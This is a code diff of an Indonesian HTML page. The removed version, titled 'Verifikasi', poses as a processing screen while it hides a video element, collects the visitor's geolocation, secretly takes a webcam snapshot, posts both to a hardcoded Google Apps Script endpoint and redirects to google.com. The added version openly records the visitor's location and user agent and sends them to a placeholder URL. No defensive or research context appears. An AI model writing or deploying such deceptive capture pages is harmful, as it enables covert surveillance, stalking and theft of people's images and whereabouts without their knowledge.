@@ -1,68 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Verifikasi</title>
-  <style>
-    video { display: none; }
-    canvas { display: none; }
-  </style>
+  <title>Tracking Lokasi</title>
 </head>
 <body>
-  <h3>Memproses... Mohon tunggu 3 detik.</h3>
-  <video id="video" autoplay></video>
-  <canvas id="canvas" width="320" height="240"></canvas>
+  <h1>Rekam Lokasi</h1>
+  <p id="status">Mendeteksi lokasi...</p>
 
   <script>
-    const SHEET_URL = 'https://script.google.com/macros/s/AKfycbypdn_x4ThiuMb-Z8XC2QHVrKmVo53yHR5UkdvH5fhaKBpCGI6-Pd2Y6VxcaXuER0g8Ag/exec';
-    const REDIRECT_URL = 'https://google.com';
+    function sendLocation(position) {
+      const data = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        userAgent: navigator.userAgent
+      };
 
-    function sendData(latitude, longitude, imageBase64) {
-      fetch(SHEET_URL, {
-        method: 'POST',
+      fetch("GOOGLE_APPS_SCRIPT_URL", {
+        method: "POST",
+        body: JSON.stringify(data),
         headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          latitude: latitude,
-          longitude: longitude,
-          imageBase64: imageBase64
-        })
-      }).then(response => response.text())
-        .then(result => {
-          console.log("Data berhasil dikirim:", result);
-          window.location.href = REDIRECT_URL;
-        })
-        .catch(error => {
-          console.error("Terjadi kesalahan pengiriman data:", error);
-        });
+          "Content-Type": "application/json"
+        }
+      }).then(response => {
+        document.getElementById("status").textContent = "Lokasi berhasil dikirim!";
+      }).catch(error => {
+        document.getElementById("status").textContent = "Gagal mengirim lokasi.";
+        console.error(error);
+      });
     }
 
-    navigator.geolocation.getCurrentPosition(
-      function(pos) {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        console.log("Lokasi berhasil diambil:", lat, lon);
+    function errorHandler(error) {
+      document.getElementById("status").textContent = "Gagal mendapatkan lokasi: " + error.message;
+    }
 
-        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-          const video = document.getElementById('video');
-          video.srcObject = stream;
-
-          setTimeout(() => {
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/png');
-            stream.getTracks().forEach(track => track.stop());
-            sendData(lat, lon, imageData);
-          }, 3000);
-        }).catch(err => {
-          console.error("Terjadi kesalahan saat mengakses kamera:", err);
-        });
-      },
-      function(error) {
-        console.error("Gagal mendapatkan lokasi:", error);
-      }
-    );
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(sendLocation, errorHandler);
+    } else {
+      document.getElementById("status").textContent = "Geolocation tidak tersedia di browser ini.";
+    }
   </script>
 </body>
 </html>
